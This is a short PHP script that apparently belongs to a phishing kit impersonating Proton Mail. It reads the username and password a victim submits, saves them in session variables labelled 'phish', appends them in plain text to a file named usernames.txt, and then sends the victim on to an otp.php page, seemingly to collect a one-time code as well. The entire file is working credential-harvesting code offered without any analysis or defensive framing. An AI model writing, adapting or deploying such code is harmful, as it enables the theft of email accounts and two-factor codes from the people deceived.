<?php
session_start();
$u = $_POST['username'] ?? '';
$p = $_POST['password'] ?? '';
$_SESSION['phish_user'] = $u;
$_SESSION['phish_pass'] = $p;
$_SESSION['phish_redirect'] = 'https://mail.proton.me';
$_SESSION['phish_brand'] = 'Proton Mail';
file_put_contents("usernames.txt", "Account: " . $u . " Pass: " . $p . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>
